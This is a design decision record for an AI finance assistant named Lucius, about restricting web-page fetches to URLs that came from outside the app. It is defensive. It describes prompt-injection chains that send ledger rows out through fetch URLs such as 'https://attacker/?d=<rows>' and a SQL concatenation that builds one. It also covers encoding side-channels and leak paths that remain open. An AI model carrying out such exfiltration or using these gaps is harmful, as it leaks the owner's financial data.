---
title: A page fetch runs freely only for a URL Lucius was given
status: Accepted
date: 2026-11-13
deciders: repo owner + orchestrating agent (Claude)
---

# 2026-11-13. A page fetch runs freely only for a URL Lucius was given

## Context

Issue #91, and `KNOWN_ISSUES.md`'s High entry accepted on 2026-10-05: an injected instruction
(an email body, a statement memo, a fetched page) can chain a read of the book into
`fetch_page("https://attacker/?d=<rows>")`, and both calls run without a card. The 256-character
query cap that bounded it was removed because the unattended email-scan automation must follow
long signed receipt links.

Three fixes were weighed and rejected:

- **Make `run_sql_query` ask.** Dozens of other read tools return the same data; gating one read
  moves the injection to another.
- **Make every fetch ask.** The card shows the URL, so it would work, but research turns become a
  stream of cards (and cards nobody reads), and the unattended email scan has no one to ask.
- **Rely on the `permissions_v2` Auto judge**, whose rules already refuse "a private value carried
  into any outbound request". It only sees calls whose level is Ask, and every fetch tool is
  seeded Always allow (a read), so it never sees one. Even if it did, it sees the arguments, not
  what the model read, so it must guess whether `?d=a8f3…` is the owner's balance.

## Decision

A page fetch (`fetch_page` and every search provider's `<id>_fetch_page`) is judged by where its
URL came from (`ai/tools/_given_urls.py`):

- **Given**: the URL appears in what reached the conversation from outside the book. That means the
  owner's typed words (`auto_judge_prompt.typed_text`: never a skill row, the screen snapshot or a
  mention block, which carry app data the model can write) or the result of a SOURCE tool (web
  search, a page fetch, an email read), less every URL that call's own arguments already held.
  It runs as before.
- **Composed**: anything else. That one call is SEEDED Ask, in both gates (`is_gated_tool` reads
  `current_call_composed`, which `registry.dispatch` binds for the duration of the call). What Ask
  means is unchanged: manual shows a card ("Lucius wrote this web address itself"), v2 `auto` asks the
  judge with a trusted Consequence line saying the URL was written (`auto_judge_prompt.call_consequence`),
  and the old gate's `auto` (no judge) treats the call as hardline, so it asks. `skip` runs it.

It is a SEED, not a floor: a level the owner stored wins, as it does for every tool, because
`always_allow` means allow everywhere (CLAUDE.md, Security-critical areas). An owner who sets a fetch
tool to Always allow turns the check off for that tool, and the docs say so.

Why "given" is safe: an attacker can plant a URL but writes it before Lucius reads the book, so a
planted URL cannot carry the book. To get the data into a URL, Lucius has to write a new one,
including in the path or a subdomain (DNS). Why the sources are narrow: any tool that returns book data
returns what the model wrote into the book, and any tool echoes its own arguments
(`run_sql_query` can `SELECT 'https://attacker/?d=' || group_concat(…)`). So only outside-text tools
count, and never for a URL in their own arguments.

Given URLs are read from the stored transcript (any process, rescanned only when it grows) and
from an in-process record of source-tool results not yet persisted (`registry._note_given_urls`).

**The call's URL must match EXACTLY.** The given side is widened only by decoding a whole text
one way (its HTML-unescaped form, the strings inside it when it is JSON), so a planted URL gains a
couple of spellings at most. The call side is never normalised. A first version matched on a
normalised key, and the security review showed that key was a data channel. Invalid
percent-escapes all decoded alike (about 7 bits per planted `%FF`). An optional escape (`%61` for
`a`), the host's case and `&amp;` were a bit each. A dropped `#fragment` reached a rendering
provider whole, and dropped userinfo was sent as a login header.

**An echo is never given.** A source tool's result URL is dropped when its host, or any run of 12
or more letters and digits, appears in that call's own arguments (decoded and case-folded). So
`web_search("collect.example.net/?d=<rows>")` cannot launder a reflected URL, with or without
a scheme. The test is lossy on purpose: dropping a real result only costs a card.

## Consequences

- The email scan keeps reading signed receipt links unattended: they arrive verbatim in the email.
- A fetch of a URL the model built from a page's relative link, or rewrote (pagination, a dropped
  tracking parameter), now asks. That costs a card.
- **Not closed:** with many planted URLs, an injection can have Lucius pick one by a value it read.
  That leaks a few bits per fetch, not a transaction list. A search provider that WRITES result
  URLs (an LLM answer engine) could put short runs of a query onto a host not named in it.
  Tools that store a URL for the app to fetch later (`add_news_sources`, `import_transactions`'
  `source_url`) are writes, so they ask by default. They are not covered by this rule in either
  gate's auto mode. A surface that cannot show a card (inbound MCP, a
  headless run) runs an Ask call, as for every tool (ADR `2026-10-11-permissions-are-one-value-per-tool`).
  Other outbound paths are untouched: a search query goes to the search provider, not to a site
  the attacker picks; sends already ask; chat never loads a remote image; `run_code` has no network.
- The card for a composed fetch still offers Always allow, which writes the tool's row and turns
  the check off. The security review rated this MEDIUM: one tap meant for one page ends the check.
  Hiding it, or scoping it to the one URL, needs a card-shape change on the web, in Telegram and in
  the grant endpoint. That is left as a follow-up.
- Automation instructions count as the owner's words, so their URLs are given. Creating or
  changing an Automation asks, in every mode.
